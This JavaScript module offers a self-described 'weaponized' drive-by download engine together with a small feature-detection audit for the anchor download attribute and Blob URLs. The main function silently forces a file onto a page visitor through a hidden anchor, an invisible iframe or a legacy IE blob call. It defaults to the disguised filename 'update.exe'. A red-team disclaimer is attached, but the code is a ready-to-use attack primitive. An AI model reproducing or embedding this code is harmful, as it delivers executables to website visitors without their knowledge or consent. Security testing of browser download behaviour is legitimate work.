/**
 * download_drive_by.js — Drive‑By Download Engine & Download Attribute Audit
 *
 * This module provides:
 *   1. `triggerDriveByDownload()` – a weaponized, production‑grade function that
 *      automatically initiates a file download (executable payload, document,
 *      etc.) using an invisible anchor element, Blob URLs, and fallback
 *      techniques. Designed for authorised red‑team simulations of drive‑by
 *      download attacks.
 *
 *   2. Default export – a Pinpoint‑compatible `Download_Attribute_Audit` that
 *      audits the HTMLAnchorElement `download` attribute support and
 *      `URL.createObjectURL` availability.
 *
 * **Use only on systems you own or with explicit permission. Unauthorised
 *   drive‑by downloads are illegal.**
 */

// ---------------------------------------------------------------------------
// 1. Core drive‑by download function
// ---------------------------------------------------------------------------

/**
 * Triggers a file download in the browser, usually without any user
 * interaction beyond the script execution context. Uses the most reliable
 * method available:
 *
 *   - HTMLAnchorElement with `download` attribute (standard)
 *   - `navigator.msSaveOrOpenBlob` (legacy IE / Edge)
 *   - Iframe fallback for older browsers
 *
 * @param {Object}   options
 * @param {string|Blob|ArrayBuffer} options.payload – The file content or URL.
 *        If a string, it is treated as a direct URL to the resource.
 *        If a Blob or ArrayBuffer, it is converted to an object URL.
 * @param {string}   [options.filename='update.exe'] – The suggested filename for the download.
 * @param {string}   [options.mimeType='application/octet-stream'] – MIME type for the Blob (ignored if payload is a URL).
 * @param {boolean}  [options.autoRemove=true] – If true, the anchor element is removed from DOM after download.
 * @param {number}   [options.timeout=5000] – Ms after which the anchor is removed if download hasn't started.
 * @param {string}   [options.method='auto'] – 'anchor', 'iframe', 'msBlob', or 'auto' to try best.
 * @returns {Promise<boolean>} – Resolves `true` if a download was likely triggered,
 *          `false` if all methods failed. (Best‑effort, not a guarantee of actual file save.)
 */
export async function triggerDriveByDownload(options = {}) {
    const {
        payload,
        filename = 'update.exe',
        mimeType = 'application/octet-stream',
        autoRemove = true,
        timeout = 5000,
        method = 'auto',
    } = options;

    if (!payload) {
        throw new Error('[triggerDriveByDownload] No payload provided.');
    }

    // ---- Prepare downloadable URL ----
    let downloadUrl;
    let isBlob = false;

    if (typeof payload === 'string') {
        // Direct URL
        downloadUrl = payload;
    } else if (payload instanceof Blob) {
        isBlob = true;
        downloadUrl = URL.createObjectURL(payload);
    } else if (payload instanceof ArrayBuffer) {
        isBlob = true;
        const blob = new Blob([payload], { type: mimeType });
        downloadUrl = URL.createObjectURL(blob);
    } else {
        throw new Error('[triggerDriveByDownload] Payload must be a URL string, Blob, or ArrayBuffer.');
    }

    // ---- Internal functions for each method ----

    /**
     * Standard anchor click with download attribute.
     * @returns {boolean} true if no error occurred.
     */
    function tryAnchor() {
        try {
            const anchor = document.createElement('a');
            anchor.href = downloadUrl;
            anchor.download = filename;
            anchor.style.display = 'none';
            document.body.appendChild(anchor);
            anchor.click();
            if (autoRemove) {
                setTimeout(() => {
                    if (anchor.parentNode) anchor.remove();
                    if (isBlob) URL.revokeObjectURL(downloadUrl);
                }, timeout);
            }
            return true;
        } catch (e) {
            console.warn('[triggerDriveByDownload] Anchor method failed:', e);
            return false;
        }
    }

    /**
     * Fallback using an invisible iframe (old browsers or sandboxed contexts).
     */
    function tryIframe() {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = downloadUrl;
            document.body.appendChild(iframe);
            if (autoRemove) {
                setTimeout(() => {
                    if (iframe.parentNode) iframe.remove();
                    if (isBlob) URL.revokeObjectURL(downloadUrl);
                }, timeout);
            }
            return true;
        } catch (e) {
            console.warn('[triggerDriveByDownload] Iframe method failed:', e);
            return false;
        }
    }

    /**
     * Legacy Internet Explorer / Edge via msSaveOrOpenBlob.
     */
    function tryMsBlob() {
        if (typeof navigator.msSaveOrOpenBlob !== 'function') return false;
        try {
            const blob = isBlob
                ? payload instanceof Blob ? payload : new Blob([payload], { type: mimeType })
                : new Blob([downloadUrl], { type: mimeType }); // If payload was a URL, this is a guess – not ideal.
            navigator.msSaveOrOpenBlob(blob, filename);
            if (isBlob && autoRemove) {
                setTimeout(() => URL.revokeObjectURL(downloadUrl), timeout);
            }
            return true;
        } catch (e) {
            console.warn('[triggerDriveByDownload] msSaveOrOpenBlob failed:', e);
            return false;
        }
    }

    // ---- Method selection ----
    if (method === 'anchor') return tryAnchor();
    if (method === 'iframe') return tryIframe();
    if (method === 'msBlob') return tryMsBlob();
    // 'auto' -> try anchor first, then iframe, then msBlob
    if (tryAnchor()) return true;
    if (tryIframe()) return true;
    if (tryMsBlob()) return true;
    return false;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Download_Attribute_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'download_drive_by',
    title: 'Download_Attribute_Audit',
    level: 6,
    info: 'Audits HTMLAnchorElement download attribute support and URL.createObjectURL availability.',
    steps: [
        'Check download attribute on HTMLAnchorElement.',
        'Check URL.createObjectURL support.',
    ],
    run: async () => {
        const a = document.createElement('a');
        const downloadSupported = 'download' in a;
        const blobSupported = typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function';

        return {
            downloadAttributeSupported: downloadSupported,
            blobObjectUrlSupported: blobSupported,
        };
    },
};

export default pinpointModule;